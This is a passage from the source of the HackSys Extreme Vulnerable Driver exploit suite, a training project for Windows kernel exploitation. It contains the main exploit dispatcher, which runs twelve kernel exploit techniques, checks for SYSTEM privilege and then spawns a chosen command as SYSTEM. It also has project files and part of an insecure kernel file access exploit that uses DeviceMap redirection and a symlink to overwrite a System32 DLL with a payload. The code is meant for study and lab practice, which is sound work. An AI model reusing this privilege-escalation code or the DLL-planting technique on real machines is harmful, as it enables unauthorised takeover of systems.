        DEBUG_INFO("\t\t[+] Process ID Of %s: %d\n", TargetProcess, ProcessID);
    }

    DEBUG_MESSAGE("\t[+] Trying To Open %s With PROCESS_ALL_ACCESS\n", TargetProcess);

    // Open the process to check the privilege level, if we are able
    // to open any SYSTEM process, this means we have successfully
    // elevated current process privileges
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);

    if (!hProcess) {
        DEBUG_ERROR("\t\t[-] Failed To Open %s Process: 0x%X\n", TargetProcess, GetLastError());
    }
    else {
        DEBUG_INFO("\t\t[+] Process Handle Of %s: 0x%X\n", TargetProcess, hProcess);
        IsHighPrivileged = TRUE;
    }

    return IsHighPrivileged;
}

VOID Exploit(PEXPLOIT_VULNERABILITY ExploitVulnerability) {
    DWORD Start, Stop = 0;
    DOUBLE ElapsedTime = 0.000;
    STARTUPINFO StartupInfo = {0};
    PROCESS_INFORMATION ProcessInformation = {0};
    VULNERABILITY_TYPE VulnerabilityType = ExploitVulnerability->VulnerabilityType;

    // Log the start TickCount
    Start = GetTickCount();

    // Determine type of vulnerability to exploit
    switch (VulnerabilityType) {
        case DoubleFetch:
            DEBUG_MESSAGE("[+] Starting Double Fetch Exploitation\n");
            LaunchExploitThread(&DoubleFetchThread);
            DEBUG_MESSAGE("[+] Completed Double Fetch Exploitation\n");
            break;
        case PoolOverflow:
            DEBUG_MESSAGE("[+] Starting Pool Overflow Exploitation\n");
            LaunchExploitThread(&PoolOverflowThread);
            DEBUG_MESSAGE("[+] Completed Pool Overflow Exploitation\n");
            break;
        case UseAfterFree:
            DEBUG_MESSAGE("[+] Starting Use After Free Exploitation\n");
            LaunchExploitThread(&UseAfterFreeThread);
            DEBUG_MESSAGE("[+] Completed Use After Free Exploitation\n");
            break;
        case TypeConfusion:
            DEBUG_MESSAGE("[+] Starting Type Confusion Exploitation\n");
            LaunchExploitThread(&TypeConfusionThread);
            DEBUG_MESSAGE("[+] Completed Type Confusion Exploitation\n");
            break;
        case StackOverflow:
            DEBUG_MESSAGE("[+] Starting Stack Overflow Exploitation\n");
            LaunchExploitThread(&StackOverflowThread);
            DEBUG_MESSAGE("[+] Completed Stack Overflow Exploitation\n");
            break;
        case IntegerOverflow:
            DEBUG_MESSAGE("[+] Starting Integer Overflow Exploitation\n");
            LaunchExploitThread(&IntegerOverflowThread);
            DEBUG_MESSAGE("[+] Completed Integer Overflow Exploitation\n");
            break;
        case StackOverflowGS:
            DEBUG_MESSAGE("[+] Starting Stack Overflow GS Exploitation\n");
            LaunchExploitThread(&StackOverflowGSThread);
            DEBUG_MESSAGE("[+] Completed Stack Overflow GS Exploitation\n");
            break;
        case ArbitraryOverwrite:
            DEBUG_MESSAGE("[+] Starting Arbitrary Memory Overwrite Exploitation\n");
            LaunchExploitThread(&ArbitraryOverwriteThread);
            DEBUG_MESSAGE("[+] Completed Arbitrary Memory Overwrite Exploitation\n");
            break;
        case UninitializedHeapVariable:
            DEBUG_MESSAGE("[+] Starting Uninitialized Heap Variable Exploitation\n");
            LaunchExploitThread(&UninitializedHeapVariableThread);
            DEBUG_MESSAGE("[+] Completed Uninitialized Heap Variable Exploitation\n");
            break;
        case UninitializedStackVariable:
            DEBUG_MESSAGE("[+] Starting Uninitialized Stack Variable Exploitation\n");
            LaunchExploitThread(&UninitializedStackVariableThread);
            DEBUG_MESSAGE("[+] Completed Uninitialized Stack Variable Exploitation\n");
            break;
        case NullPointerDereference:
            DEBUG_MESSAGE("[+] Starting Null Pointer Dereference Exploitation\n");
            LaunchExploitThread(&NullPointerDereferenceThread);
            DEBUG_MESSAGE("[+] Completed Null Pointer Dereference Exploitation\n");
            break;
        case InsecureKernelFileAccess:
            DEBUG_MESSAGE("[+] Starting Insecure Kernel File Access Exploitation\n");
            LaunchExploitThread(&InsecureKernelFileAccessThread);
            DEBUG_MESSAGE("[+] Completed Insecure Kernel File Access Exploitation\n");
            break;
    }

    DEBUG_MESSAGE("[+] Checking Current Process Privileges\n");

    // Verify if the privilege escalation was successful
    if (!IsProcessHavingHigherPrivilege("csrss.exe")) {
        DEBUG_ERROR("\t[-] Failed To Elevate Privileges Of Current Process\n");
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_MESSAGE("\t[+] Successfully Elevated Current Process Privileges\n");
    }

    StartupInfo.wShowWindow = SW_SHOW;
    StartupInfo.cb          = sizeof(STARTUPINFO);
    StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;

    // Log the stop TickCount
    Stop = GetTickCount();

    // Calculate the elapsed time between two tick counts
    ElapsedTime = (Stop - Start) / 1000.000;

    DEBUG_MESSAGE("[+] Enjoy As SYSTEM [%.3f]s\n\n", ElapsedTime);

    if (!CreateProcess(NULL,
                       ExploitVulnerability->Command,
                       NULL,
                       NULL,
                       FALSE,
                       CREATE_NEW_CONSOLE,
                       NULL,
                       NULL,
                       &StartupInfo,
                       &ProcessInformation)) {
        DEBUG_ERROR("[-] Failed to Create Target Process: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    WaitForSingleObject(ProcessInformation.hProcess, INFINITE);

    // Close the open handles
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
}


INT main(UINT argc, PTCHAR argv[]) {
    CONST PTCHAR Banner =
        "\t\t                                               \t\n"
        "\t\t    ##     ## ######## ##     ## ########      \t\n"
        "\t\t    ##     ## ##       ##     ## ##     ##     \t\n"
        "\t\t    ##     ## ##       ##     ## ##     ##     \t\n"
        "\t\t    ######### ######   ##     ## ##     ##     \t\n"
        "\t\t    ##     ## ##        ##   ##  ##     ##     \t\n"
        "\t\t    ##     ## ##         ## ##   ##     ##     \t\n"
        "\t\t    ##     ## ########    ###    ########      \t\n"
        "\t\t                                               \t\n"
        "\t\t  HackSys Extreme Vulnerable Driver Exploits   \t\n"
        "\t\t         Ashfaq Ansari (@HackSysTeam)          \t\n"
        "\t\t           ashfaq[at]payatu[dot]com            \t\n"
        "\t\t                                               \t\n";

    PTCHAR CommandToExecute = NULL;
    EXPLOIT_VULNERABILITY ExploitVulnerability;

    ClearScreen();
    CenterConsoleScreen();

    // Print the banner
    DEBUG_SUCCESS(Banner);

    if (argc < 3) {
        ShowUsage(argv[0]);
    }

    // Parse the command line arguments
    ARGBEGIN {
    case 'd':
        ExploitVulnerability.VulnerabilityType = DoubleFetch;
        break;
    case 'p':
        ExploitVulnerability.VulnerabilityType = PoolOverflow;
        break;
    case 'u':
        ExploitVulnerability.VulnerabilityType = UseAfterFree;
        break;
    case 't':
        ExploitVulnerability.VulnerabilityType = TypeConfusion;
        break;
    case 's':
        ExploitVulnerability.VulnerabilityType = StackOverflow;
        break;
    case 'i':
        ExploitVulnerability.VulnerabilityType = IntegerOverflow;
        break;
    case 'g':
        ExploitVulnerability.VulnerabilityType = StackOverflowGS;
        break;
    case 'a':
        ExploitVulnerability.VulnerabilityType = ArbitraryOverwrite;
        break;
    case 'h':
        ExploitVulnerability.VulnerabilityType = UninitializedHeapVariable;
        break;
    case 'v':
        ExploitVulnerability.VulnerabilityType = UninitializedStackVariable;
        break;
    case 'n':
        ExploitVulnerability.VulnerabilityType = NullPointerDereference;
        break;
    case 'f':
        ExploitVulnerability.VulnerabilityType = InsecureKernelFileAccess;
        break;
    case 'c':
        ExploitVulnerability.Command = EARGF(ShowUsage(argv[0]));
        break;
    default:
        ShowUsage(argv[0]);
    } ARGEND;

    // Start the exploitation
    Exploit(&ExploitVulnerability);

    return EXIT_SUCCESS;
}

```

`Exploit/HackSysEVDExploit.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    HackSysEVDExploit.h

Abstract:
    This module implements the data structures used by the
    main exploit module handling the exploitation routines.

--*/

#ifndef __EXPLOIT_H__
    #define __EXPLOIT_H__

    #pragma once

    #include "arg.h"
    #include "Common.h"

    typedef enum _VULNERABILITY_TYPE {
        DoubleFetch,
        PoolOverflow,
        UseAfterFree,
        TypeConfusion,
        StackOverflow,
        IntegerOverflow,
        StackOverflowGS,
        ArbitraryOverwrite,
        NullPointerDereference,
        InsecureKernelFileAccess,
        UninitializedHeapVariable,
        UninitializedStackVariable,
    } VULNERABILITY_TYPE, *PVULNERABILITY_TYPE;

    typedef struct _EXPLOIT_VULNERABILITY {
        PTCHAR             Command;
        VULNERABILITY_TYPE VulnerabilityType;
    } EXPLOIT_VULNERABILITY, *PEXPLOIT_VULNERABILITY;

    static VOID    ShowUsage(PTCHAR Process);
    BOOL           IsProcessHavingHigherPrivilege(LPCSTR TargetProcess);
    VOID           Exploit(PEXPLOIT_VULNERABILITY ExploitVulnerability);
    VOID           LaunchExploitThread(LPTHREAD_START_ROUTINE ExploitHandlerThread);

#endif //__EXPLOIT_H__

```

`Exploit/HackSysEVDExploit.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 11.00
# Visual Studio 2010
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HackSysEVDExploit", "HackSysEVDExploit.vcxproj", "{A432D8CD-BCEA-49B5-81EE-20B926D7421A}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Win32 = Debug|Win32
		Release|Win32 = Release|Win32
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{A432D8CD-BCEA-49B5-81EE-20B926D7421A}.Debug|Win32.ActiveCfg = Debug|Win32
		{A432D8CD-BCEA-49B5-81EE-20B926D7421A}.Debug|Win32.Build.0 = Debug|Win32
		{A432D8CD-BCEA-49B5-81EE-20B926D7421A}.Release|Win32.ActiveCfg = Release|Win32
		{A432D8CD-BCEA-49B5-81EE-20B926D7421A}.Release|Win32.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`Exploit/HackSysEVDExploit.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{A432D8CD-BCEA-49B5-81EE-20B926D7421A}</ProjectGuid>
    <RootNamespace>HackSysEVDExploit</RootNamespace>
    <ProjectName>HackSysEVDExploit</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
    </ClCompile>
    <Link>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
    </ClCompile>
    <Link>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="ArbitraryOverwrite.c" />
    <ClCompile Include="Common.c" />
    <ClCompile Include="DoubleFetch.c" />
    <ClCompile Include="HackSysEVDExploit.c" />
    <ClCompile Include="InsecureKernelResourceAccess.c" />
    <ClCompile Include="IntegerOverflow.c" />
    <ClCompile Include="NullPointerDereference.c" />
    <ClCompile Include="PoolOverflow.c" />
    <ClCompile Include="Payloads.c" />
    <ClCompile Include="StackOverflow.c" />
    <ClCompile Include="StackOverflowGS.c" />
    <ClCompile Include="TypeConfusion.c" />
    <ClCompile Include="UninitializedHeapVariable.c" />
    <ClCompile Include="UninitializedStackVariable.c" />
    <ClCompile Include="UseAfterFree.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ArbitraryOverwrite.h" />
    <ClInclude Include="arg.h" />
    <ClInclude Include="Common.h" />
    <ClInclude Include="DoubleFetch.h" />
    <ClInclude Include="HackSysEVDExploit.h" />
    <ClInclude Include="InsecureKernelResourceAccess.h" />
    <ClInclude Include="IntegerOverflow.h" />
    <ClInclude Include="NullPointerDereference.h" />
    <ClInclude Include="PoolOverflow.h" />
    <ClInclude Include="Payloads.h" />
    <ClInclude Include="StackOverflow.h" />
    <ClInclude Include="StackOverflowGS.h" />
    <ClInclude Include="TypeConfusion.h" />
    <ClInclude Include="UninitializedHeapVariable.h" />
    <ClInclude Include="UninitializedStackVariable.h" />
    <ClInclude Include="UseAfterFree.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Exploit/HackSysEVDExploit.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="UseAfterFree.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Common.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PoolOverflow.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StackOverflow.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StackOverflowGS.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TypeConfusion.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IntegerOverflow.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="NullPointerDereference.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ArbitraryOverwrite.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Payloads.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HackSysEVDExploit.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UninitializedStackVariable.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UninitializedHeapVariable.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DoubleFetch.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="InsecureKernelResourceAccess.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="arg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UseAfterFree.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PoolOverflow.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="StackOverflow.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="StackOverflowGS.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TypeConfusion.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IntegerOverflow.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="NullPointerDereference.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ArbitraryOverwrite.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Payloads.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="HackSysEVDExploit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UninitializedStackVariable.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UninitializedHeapVariable.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DoubleFetch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="InsecureKernelResourceAccess.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Exploit/InsecureKernelResourceAccess.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    InsecureKernelResourceAccess.c

Abstract:
    This module implements the exploit for Insecure Kernel Resource Access Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

References:
    https://github.com/tyranid/windows-logical-eop-workshop

--*/

#include "InsecureKernelResourceAccess.h"

NTSTATUS SetProcessDeviceMap(HANDLE DirectoryHandle) {
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PROCESS_DEVICEMAP_INFORMATION DeviceMap = {DirectoryHandle};

    NtStatus = NtSetInformationProcess((HANDLE)0xFFFFFFFF,
                                       ProcessDeviceMap,
                                       &DeviceMap,
                                       sizeof(DeviceMap));
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t[-] Failed to set per-process DeviceMap: 0x%X\n", NtStatus);
        exit(EXIT_FAILURE);
    }

    return NtStatus;
}

HANDLE CreateObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) {
    HANDLE DirectoryHandle = NULL;
    UNICODE_STRING ObjectName = {0};
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES ObjectAttributes = {0};
    PUNICODE_STRING pUnicodeObjectName = NULL;

    if (DirectoryName) {
        RtlInitUnicodeString(&ObjectName, DirectoryName);
        pUnicodeObjectName = &ObjectName;
    }

    InitializeObjectAttributes(&ObjectAttributes,
                               pUnicodeObjectName,
                               OBJ_CASE_INSENSITIVE,
                               hRoot,
                               0);

    NtStatus = NtCreateDirectoryObject(&DirectoryHandle, DIRECTORY_ALL_ACCESS, &ObjectAttributes);
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t[-] Failed to create object directory: 0x%X\n", NtStatus);
        exit(EXIT_FAILURE);
    }

    return DirectoryHandle;
}

HANDLE OpenObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) {
    HANDLE DirectoryHandle = NULL;
    UNICODE_STRING ObjectName = {0};
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES ObjectAttributes = {0};

    RtlInitUnicodeString(&ObjectName, DirectoryName);
    InitializeObjectAttributes(&ObjectAttributes, &ObjectName, OBJ_CASE_INSENSITIVE, hRoot, NULL);

    NtStatus = NtOpenDirectoryObject(&DirectoryHandle, MAXIMUM_ALLOWED, &ObjectAttributes);
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
        exit(EXIT_FAILURE);
    }

    return DirectoryHandle;
}

HANDLE CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName) {
    HANDLE SymbolicLinkHandle = NULL;
    UNICODE_STRING TargetObjectName = {0};
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES ObjectAttributes = {0};
    UNICODE_STRING SymbolicLinkObjectName = {0};

    RtlInitUnicodeString(&SymbolicLinkObjectName, SymbolicLinkName);
    RtlInitUnicodeString(&TargetObjectName, TargetName);

    InitializeObjectAttributes(&ObjectAttributes,
                               &SymbolicLinkObjectName,
                               OBJ_CASE_INSENSITIVE,
                               hRoot,
                               NULL);

    NtStatus = NtCreateSymbolicLinkObject(&SymbolicLinkHandle,
                                          SYMBOLIC_LINK_ALL_ACCESS,
                                          &ObjectAttributes,
                                          &TargetObjectName);
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t[-] Failed to create symbolic link object: 0x%X\n", NtStatus);
        exit(EXIT_FAILURE);
    }

    return SymbolicLinkHandle;
}

VOID WritePayloadDll(LPCTSTR szPath) {
    CHAR Buffer[4096] = {0};
    HANDLE TargetDllFileHandle = NULL;
    HANDLE SourceDllFileHandle = NULL;
    DWORD dwBytesRead, dwBytesWritten;
    LPCTSTR SourceDllFilePath = "payload.dll";

    TargetDllFileHandle = CreateFile(szPath,
                                     GENERIC_ALL,
                                     0,
                                     NULL,
                                     OPEN_EXISTING,
                                     FILE_ATTRIBUTE_NORMAL,
                                     NULL);

    if (TargetDllFileHandle == INVALID_HANDLE_VALUE) {
        DEBUG_ERROR("\t\t[-] Target file does not exist: %s\n", szPath);
        exit(EXIT_FAILURE);
    }

    SourceDllFileHandle = CreateFile(SourceDllFilePath,
                                     GENERIC_ALL,
                                     0,
                                     NULL,
                                     OPEN_EXISTING,
                                     FILE_ATTRIBUTE_NORMAL,
                                     NULL);

    if (SourceDllFileHandle == INVALID_HANDLE_VALUE) {
        DEBUG_ERROR("\t\t[-] Source payload DLL file does not exist: %s\n", SourceDllFilePath);
        exit(EXIT_FAILURE);
    }

    do {
        if (!ReadFile(SourceDllFileHandle, Buffer, sizeof(Buffer), &dwBytesRead, NULL)) {
            DEBUG_ERROR("\t\t[-] Unable to read file: %s\n", SourceDllFilePath);
            break;
        }

        if (dwBytesRead == 0) {
            break;
        }

        if (!WriteFile(TargetDllFileHandle, Buffer, dwBytesRead, &dwBytesWritten, NULL)) {
            DEBUG_ERROR("\t\t[-] Unable to write file: %s\n", szPath);
            break;
        }
    }
    while (TRUE);

    CloseHandle(SourceDllFileHandle);
    CloseHandle(TargetDllFileHandle);
}

VOID LaunchWMIProcess() {
    STARTUPINFOW StartupInformation;
    PROCESS_INFORMATION ProcessInformation;

    ZeroMemory(&StartupInformation, sizeof(StartupInformation));
    StartupInformation.cb = sizeof(StartupInformation);

    ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

    if (CreateProcessW(L"C:\\Windows\\System32\\wbem\\wmic.exe",
                       L"wmic baseboard",
                       NULL,
                       NULL,
                       FALSE,
                       CREATE_NO_WINDOW,
                       NULL,
                       NULL,
                       &StartupInformation,
                       &ProcessInformation)) {
        WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
        CloseHandle(ProcessInformation.hProcess);
        CloseHandle(ProcessInformation.hThread);
    }
}

DWORD WINAPI InsecureKernelFileAccessThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    HANDLE hTempObject = NULL;
    HANDLE hGlobalRootObject = NULL;
    HANDLE hPerProcessRootObject = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        // Resolve Kernel Symbols
        ResolveKernelAPIs();

        DEBUG_MESSAGE("\t[+] Creating Object Directories\n");
        DEBUG_INFO("\t\t[+] \\..\\C:\\Windows\\System32\n");

        // Get create object root directory
        hPerProcessRootObject = CreateObjectDirectory(NULL, NULL);
        hTempObject = CreateObjectDirectory(hPerProcessRootObject, L"C:");
        hTempObject = CreateObjectDirectory(hTempObject, L"Windows");
        hTempObject = CreateObjectDirectory(hTempObject, L"System32");

        DEBUG_MESSAGE("\t[+] Dropping Symbolic Link\n");
